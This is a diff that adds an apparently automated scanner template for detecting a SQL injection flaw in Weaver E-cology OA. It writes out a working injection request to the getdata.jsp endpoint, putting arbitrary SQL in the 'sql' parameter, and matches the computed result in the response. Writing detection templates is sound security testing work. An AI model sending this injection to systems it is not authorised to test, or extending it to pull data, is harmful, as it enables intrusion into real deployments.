@@ -1,0 +1,21 @@
+id: weaver-e_cology-oa-sql-injection
+info:
+  name: Weaver E-cology OA SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects an SQL injection vulnerability in Weaver E-cology OA by evaluating the response for the multiplication result of two random numbers in a SQL query.
+http:
+  - raw:
+      - |
+        GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20str({{rand_int(40000, 44800)}}*{{rand_int(40000, 44800)}})%20as%20id HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\d+"
+        part: body
